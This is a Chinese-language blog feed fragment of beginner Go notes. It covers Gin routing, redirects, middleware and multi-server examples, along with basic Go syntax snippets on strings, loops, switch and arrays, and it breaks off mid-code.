<h4 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	r:=gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/index&quot;</span>,<span class="function"><span class="keyword">func</span> <span class="params">(c *gin.Context)</span></span>  &#123;</span><br><span class="line">		<span class="comment">// c.JSON(http.StatusOK,gin.H&#123;</span></span><br><span class="line">		<span class="comment">// 	&quot;status&quot;:&quot;OK&quot;,</span></span><br><span class="line">		<span class="comment">// &#125;)</span></span><br><span class="line">		<span class="comment">// HTTP 重定向</span></span><br><span class="line">		c.Redirect(http.StatusMovedPermanently,<span class="string">&quot;https://woaixiaoyuyu.github.io/&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="comment">// 路由重定向</span></span><br><span class="line">	r.GET(<span class="string">&quot;/a&quot;</span>,<span class="function"><span class="keyword">func</span> <span class="params">(c *gin.Context)</span></span>&#123;</span><br><span class="line">		<span class="comment">// 跳转到b对应的路由函数</span></span><br><span class="line">		c.Request.URL.Path=<span class="string">&quot;/b&quot;</span>  <span class="comment">// 把求情的URL路径修改</span></span><br><span class="line">		r.HandleContext(c)       <span class="comment">// 继续后续的处理</span></span><br><span class="line">	&#125;)</span><br><span class="line">	r.GET(<span class="string">&quot;/b&quot;</span>,<span class="function"><span class="keyword">func</span> <span class="params">(c *gin.Context)</span></span>&#123;</span><br><span class="line">		c.JSON(http.StatusOK,gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>:<span class="string">&quot;welcome!!!&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h4><p>原先一定要一个个方法添加，可以尝试一下Any，Group，NoRoute这些方法偷个懒</p>
<p>Any，是对一个路由的多个方法的汇总</p>
<p>Group，是对许多个前缀相同的路由进行的方法汇总；同时，路由组也是支持嵌套的</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.Any(<span class="string">&quot;/user&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="keyword">switch</span> c.Request.Method &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;method&quot;</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		<span class="keyword">case</span> http.MethodPost:</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="comment">// 设置无效路由访问的页面</span></span><br><span class="line">	r.NoRoute(<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(http.StatusNotFound, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;NO Page&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="comment">// 路由组</span></span><br><span class="line">	<span class="comment">// 把公用的前缀提取出来，创建路由组</span></span><br><span class="line">	<span class="comment">// 购物网站首页及详情页</span></span><br><span class="line">	shopGroup := r.Group(<span class="string">&quot;/shop&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		shopGroup.GET(<span class="string">&quot;/index&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;message&quot;</span>: <span class="string">&quot;index&quot;</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;)</span><br><span class="line">		shopGroup.GET(<span class="string">&quot;/login&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;message&quot;</span>: <span class="string">&quot;login_get&quot;</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;)</span><br><span class="line">		shopGroup.POST(<span class="string">&quot;/login&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;message&quot;</span>: <span class="string">&quot;login_post&quot;</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h4><p>很重要的内容，极其重要</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个中间件m1: 统计请求处理函数的耗时</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">m1</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;m1 in...&quot;</span>)</span><br><span class="line">	<span class="comment">// 计时</span></span><br><span class="line">	start := time.Now()</span><br><span class="line">	c.Set(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;xiaoyuyu&quot;</span>) <span class="comment">//设置值</span></span><br><span class="line">	c.Next()                  <span class="comment">// 调用后序处理函数</span></span><br><span class="line">	<span class="comment">// c.Abort() // 组织调用后序处理函数</span></span><br><span class="line">	cost := time.Since(start)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;cost_time:%v\n&quot;</span>, cost)</span><br><span class="line">	fmt.Println(<span class="string">&quot;m1 out...&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	<span class="comment">// r.Use(m1,m2)  // 全局注册中间件函数m1,m2</span></span><br><span class="line">	r.GET(<span class="string">&quot;/index&quot;</span>, m1, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		name, ok := c.Get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> !ok &#123;</span><br><span class="line">			name = <span class="string">&quot;none&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;index&quot;</span>,</span><br><span class="line">			<span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.GET(<span class="string">&quot;/user&quot;</span>, m1, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>路由组</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">shopGroup := r.Group(<span class="string">&quot;/shop&quot;</span>, StatCost())</span><br><span class="line">&#123;</span><br><span class="line">    shopGroup.GET(<span class="string">&quot;/index&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;...&#125;)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="中间件注意事项"><a href="#中间件注意事项" class="headerlink" title="中间件注意事项"></a>中间件注意事项</h4><h5 id="gin默认中间件"><a href="#gin默认中间件" class="headerlink" title="gin默认中间件"></a>gin默认中间件</h5><p><code>gin.Default()</code>默认使用了<code>Logger</code>和<code>Recovery</code>中间件，其中：</p>
<ul>
<li><code>Logger</code>中间件将日志写入<code>gin.DefaultWriter</code>，即使配置了<code>GIN_MODE=release</code>。</li>
<li><code>Recovery</code>中间件会recover任何<code>panic</code>。如果有panic的话，会写入500响应码。</li>
</ul>
<p>如果不想使用上面两个默认的中间件，可以使用<code>gin.New()</code>新建一个没有任何默认中间件的路由。</p>
<h5 id="gin中间件中使用goroutine"><a href="#gin中间件中使用goroutine" class="headerlink" title="gin中间件中使用goroutine"></a>gin中间件中使用goroutine</h5><p>当在中间件或<code>handler</code>中启动新的<code>goroutine</code>时，<strong>不能使用</strong>原始的上下文（c *gin.Context），必须使用其只读副本（<code>c.Copy()</code>）</p>
<h4 id="运行多个服务"><a href="#运行多个服务" class="headerlink" title="运行多个服务"></a>运行多个服务</h4><p>例子来源于中文文档，解析一下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.org/x/sync/errgroup&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	g errgroup.Group</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">router01</span><span class="params">()</span> <span class="title">http</span>.<span class="title">Handler</span></span> &#123;</span><br><span class="line">	e := gin.New()</span><br><span class="line">	e.Use(gin.Recovery())</span><br><span class="line">	e.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(</span><br><span class="line">			http.StatusOK,</span><br><span class="line">			gin.H&#123;</span><br><span class="line">				<span class="string">&quot;code&quot;</span>:  http.StatusOK,</span><br><span class="line">				<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Welcome server 01&quot;</span>,</span><br><span class="line">			&#125;,</span><br><span class="line">		)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">router02</span><span class="params">()</span> <span class="title">http</span>.<span class="title">Handler</span></span> &#123;</span><br><span class="line">	e := gin.New()</span><br><span class="line">	e.Use(gin.Recovery())</span><br><span class="line">	e.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(</span><br><span class="line">			http.StatusOK,</span><br><span class="line">			gin.H&#123;</span><br><span class="line">				<span class="string">&quot;code&quot;</span>:  http.StatusOK,</span><br><span class="line">				<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Welcome server 02&quot;</span>,</span><br><span class="line">			&#125;,</span><br><span class="line">		)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	server01 := &amp;http.Server&#123;</span><br><span class="line">		Addr:         <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">		Handler:      router01(),</span><br><span class="line">		ReadTimeout:  <span class="number">5</span> * time.Second,</span><br><span class="line">		WriteTimeout: <span class="number">10</span> * time.Second,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	server02 := &amp;http.Server&#123;</span><br><span class="line">		Addr:         <span class="string">&quot;:8081&quot;</span>,</span><br><span class="line">		Handler:      router02(),</span><br><span class="line">		ReadTimeout:  <span class="number">5</span> * time.Second,</span><br><span class="line">		WriteTimeout: <span class="number">10</span> * time.Second,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g.Go(<span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">		<span class="keyword">return</span> server01.ListenAndServe()</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	g.Go(<span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">		<span class="keyword">return</span> server02.ListenAndServe()</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := g.Wait(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>GO</tag>
      </tags>
  </entry>
  <entry>
    <title>GO_note</title>
    <url>/2020/02/25/GO-note/</url>
    <content><![CDATA[<p>GO入门学习遇到的一些小贴士，给自己当note</p>
<span id="more"></span>

<p>学习资料：<a href="https://www.liwenzhou.com/posts/Go/go_menu/">https://www.liwenzhou.com/posts/Go/go_menu/</a></p>
<h3 id="Snipples"><a href="#Snipples" class="headerlink" title="Snipples"></a>Snipples</h3><p>VS CODE中使用快捷操作，如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Place your snippets for go here. Each snippet is defined under a snippet name and has a prefix, body and </span></span><br><span class="line">	<span class="comment">// description. The prefix is what is used to trigger the snippet and the body will be expanded and inserted. Possible variables are:</span></span><br><span class="line">	<span class="comment">// $1, $2 for tab stops, $0 for the final cursor position, and $&#123;1:label&#125;, $&#123;2:another&#125; for placeholders. Placeholders with the </span></span><br><span class="line">	<span class="comment">// same ids are connected.</span></span><br><span class="line">	<span class="comment">// Example:</span></span><br><span class="line">	<span class="comment">// &quot;Print to console&quot;: &#123;</span></span><br><span class="line">	<span class="comment">// 	&quot;prefix&quot;: &quot;log&quot;,</span></span><br><span class="line">	<span class="comment">// 	&quot;body&quot;: [</span></span><br><span class="line">	<span class="comment">// 		&quot;console.log(&#x27;$1&#x27;);&quot;,</span></span><br><span class="line">	<span class="comment">// 		&quot;$2&quot;</span></span><br><span class="line">	<span class="comment">// 	],</span></span><br><span class="line">	<span class="comment">// 	&quot;description&quot;: &quot;Log output to console&quot;</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line">	<span class="string">&quot;printin&quot;</span>:&#123;</span><br><span class="line">		<span class="string">&quot;prefix&quot;</span>: <span class="string">&quot;pln&quot;</span>,</span><br><span class="line">		<span class="string">&quot;body&quot;</span>: <span class="string">&quot;fmt.Println($0)&quot;</span>,</span><br><span class="line">		<span class="string">&quot;description&quot;</span>: <span class="string">&quot;output,printin&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">&quot;printf&quot;</span>:&#123;</span><br><span class="line">		<span class="string">&quot;prefix&quot;</span>: <span class="string">&quot;plf&quot;</span>,</span><br><span class="line">		<span class="string">&quot;body&quot;</span>: <span class="string">&quot;fmt.Printf($0)&quot;</span>,</span><br><span class="line">		<span class="string">&quot;description&quot;</span>: <span class="string">&quot;output,printf&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="字符串花操及变量"><a href="#字符串花操及变量" class="headerlink" title="字符串花操及变量"></a>字符串花操及变量</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// max float of different type</span></span><br><span class="line">	fmt.Println(math.MaxFloat64)</span><br><span class="line">	fmt.Println(math.MaxFloat32)</span><br><span class="line">	<span class="comment">//complex number : 64 and 128</span></span><br><span class="line">	<span class="keyword">var</span> c <span class="keyword">complex64</span></span><br><span class="line">	c = <span class="number">1</span> + <span class="number">2i</span></span><br><span class="line">	fmt.Println(c)</span><br><span class="line">	<span class="comment">//str</span></span><br><span class="line">	str1 := <span class="string">&quot;Let&#x27;s go!\r\n&quot;</span></span><br><span class="line">	str2 := <span class="string">&quot;xiaoyuyu&quot;</span></span><br><span class="line">	fmt.Println(str1, str2) <span class="comment">//拼接后自带一个空格</span></span><br><span class="line">	<span class="comment">//多行str 用` 但是当中所有转义字符失效</span></span><br><span class="line">	str := <span class="string">`</span></span><br><span class="line"><span class="string">	first line</span></span><br><span class="line"><span class="string">	second line</span></span><br><span class="line"><span class="string">	last</span></span><br><span class="line"><span class="string">	+</span></span><br><span class="line"><span class="string">	line</span></span><br><span class="line"><span class="string">	\t\n\r</span></span><br><span class="line"><span class="string">	`</span></span><br><span class="line">	fmt.Println(str)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//字符串花操</span></span><br><span class="line">	<span class="comment">//split 切割</span></span><br><span class="line">	str3 := <span class="string">&quot;how do you do&quot;</span></span><br><span class="line">	fmt.Println(strings.Split(str3, <span class="string">&quot; &quot;</span>))</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, strings.Split(str3, <span class="string">&quot; &quot;</span>))  <span class="comment">//%T输出type</span></span><br><span class="line">	<span class="comment">//拼接切片</span></span><br><span class="line">	str4 := []<span class="keyword">string</span>&#123;<span class="string">&quot;how&quot;</span>, <span class="string">&quot;do&quot;</span>, <span class="string">&quot;you&quot;</span>, <span class="string">&quot;do&quot;</span>&#125;</span><br><span class="line">	fmt.Println(strings.Join(str4, <span class="string">&quot;+&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">//要修改字符串，需要先将其转换成[]rune或[]byte，完成后再转换为string。</span></span><br><span class="line">	<span class="comment">//无论哪种转换，都会重新分配内存，并复制字节数组</span></span><br><span class="line">	s1 := <span class="string">&quot;big&quot;</span></span><br><span class="line">	<span class="comment">// 强制类型转换</span></span><br><span class="line">	byteS1 := []<span class="keyword">byte</span>(s1)</span><br><span class="line">	byteS1[<span class="number">0</span>] = <span class="string">&#x27;p&#x27;</span></span><br><span class="line">	fmt.Println(<span class="keyword">string</span>(byteS1))</span><br><span class="line"></span><br><span class="line">	s2 := <span class="string">&quot;白萝卜&quot;</span></span><br><span class="line">	runeS2 := []<span class="keyword">rune</span>(s2)</span><br><span class="line">	runeS2[<span class="number">0</span>] = <span class="string">&#x27;红&#x27;</span></span><br><span class="line">	fmt.Println(<span class="keyword">string</span>(runeS2))</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//字符类型1：byte   字符类型2：rune</span></span><br><span class="line">	<span class="comment">//byte unit8别名 ASCII码</span></span><br><span class="line">	<span class="comment">//rune int32别名 UTF-8字符 处理中文、日文或者其他复合字符</span></span><br><span class="line">	<span class="keyword">var</span> c1 <span class="keyword">byte</span></span><br><span class="line">	<span class="keyword">var</span> c2 <span class="keyword">rune</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;c1:%T c2:%T&quot;</span>, c1, c2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="for-range（键值循环）"><a href="#for-range（键值循环）" class="headerlink" title="for range（键值循环）"></a>for range（键值循环）</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//每个 rune 字符和索引在 for range 循环中是一一对应的</span></span><br><span class="line">	<span class="comment">//它能够自动根据 UTF-8 规则识别 Unicode 编码的字符</span></span><br><span class="line">	<span class="comment">//便于我们输出中文</span></span><br><span class="line">	str5 :=<span class="string">&quot;hello大娃的力量&quot;</span></span><br><span class="line">	<span class="keyword">for</span> key,value:= <span class="keyword">range</span> str5&#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;%d %c\n&quot;</span>,key,value)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _,value:= <span class="keyword">range</span> str5&#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;%c\n&quot;</span>,value)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//普通的for循环会出现乱码，因为中文字符无法识别</span></span><br><span class="line">	<span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="built_in">len</span>(str5);i++&#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;%c\n&quot;</span>,str5[i])</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="reflect-TypeOf-获取类型"><a href="#reflect-TypeOf-获取类型" class="headerlink" title="reflect.TypeOf 获取类型"></a>reflect.TypeOf 获取类型</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//编写代码统计出字符串&quot;hello沙河小王子&quot;中汉字的数量</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	count:=<span class="number">0</span></span><br><span class="line">	str:=<span class="string">&quot;hello沙河小王子&quot;</span></span><br><span class="line">	fmt.Println(reflect.TypeOf(str))</span><br><span class="line">	<span class="keyword">for</span> _,value:=<span class="keyword">range</span> str&#123;</span><br><span class="line">		<span class="keyword">if</span> value&gt;<span class="number">256</span> &#123;</span><br><span class="line">			count++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(count)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="if-else-tips"><a href="#if-else-tips" class="headerlink" title="if else :tips"></a>if else :tips</h3><p>Go语言规定与if匹配的左括号{必须与if和表达式放在同一行，{放在其他位置会触发编译错误。 同理，与else匹配的{也必须与else写在同一行，else也必须与上一个if或else if右边的大括号在同一行</p>
<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//test switch</span></span><br><span class="line">	score := <span class="number">312</span></span><br><span class="line">	<span class="keyword">switch</span> &#123;</span><br><span class="line">	<span class="keyword">case</span> score &lt; <span class="number">270</span>: <span class="comment">//可以用值，也可以用判别式，如用判别式，可以省略switch后面的变量填充</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;Go to find jobs&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> score &gt;= <span class="number">280</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;Try to find school&quot;</span>)</span><br><span class="line">		<span class="keyword">fallthrough</span> <span class="comment">//如满足本case，下一个case结果也输出</span></span><br><span class="line">	<span class="keyword">case</span> score == <span class="number">312</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;Keep going&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> score &gt;= <span class="number">350</span> &amp;&amp; score &lt;= <span class="number">500</span>: <span class="comment">//判别式用逻辑运算符分割，值用逗号分隔</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;Congratulations&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="九九乘法表"><a href="#九九乘法表" class="headerlink" title="九九乘法表"></a>九九乘法表</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//九九乘法表</span></span><br><span class="line">	<span class="keyword">for</span> i:=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++&#123;</span><br><span class="line">		<span class="keyword">for</span> j:=<span class="number">1</span>;j&lt;=i;j++&#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%d * %d = %d\t&quot;</span>,i,j,i*j)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="数组是值类型"><a href="#数组是值类型" class="headerlink" title="数组是值类型"></a>数组是值类型</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> x = [<span class="number">3</span>][<span class="number">3</span>]<span class="keyword">int</span>&#123;</span><br><span class="line">		&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;,</span><br><span class="line">		&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;,</span><br><span class="line">		&#123;<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	y := x</span><br><span class="line">	<span class="comment">//数组是值类型，赋值和传参会复制整个数组。因此改变副本的值，不会改变本身的值</span></span><br><span class="line">	fmt.Println(y[<span class="number">0</span>][<span class="number">0</span>]) <span class="comment">//1</span></span><br><span class="line">	change(y)</span><br><span class="line">	fmt.Println(y[<span class="number">0</span>][<span class="number">0</span>]) <span class="comment">//1  没有发生改变</span></span><br><span class="line">	y[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">100</span></span><br><span class="line">	fmt.Println(y[<span class="number">0</span>][<span class="number">0</span>]) <span class="comment">//100</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//找出数组中和为指定值的两个元素的下标，</span></span><br><span class="line">	<span class="comment">//比如从数组[1, 3, 5, 7, 8]中找出和为8的两个元素的下标分别为(0,3)和(1,2)</span></span><br><span class="line">	a := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>&#125;</span><br><span class="line">	findSum(a, <span class="number">8</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">change</span><span class="params">(a [3][3]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	a[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果这里改成a [...]int会报错，说明函数里不能这么写，要确定的值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findSum</span><span class="params">(a [5]<span class="keyword">int</span>, b <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> index, value := <span class="keyword">range</span> a &#123;</span><br><span class="line">		<span class="keyword">for</span> i := index; i &lt; <span class="built_in">len</span>(a); i++ &#123;</span><br><span class="line">			<span 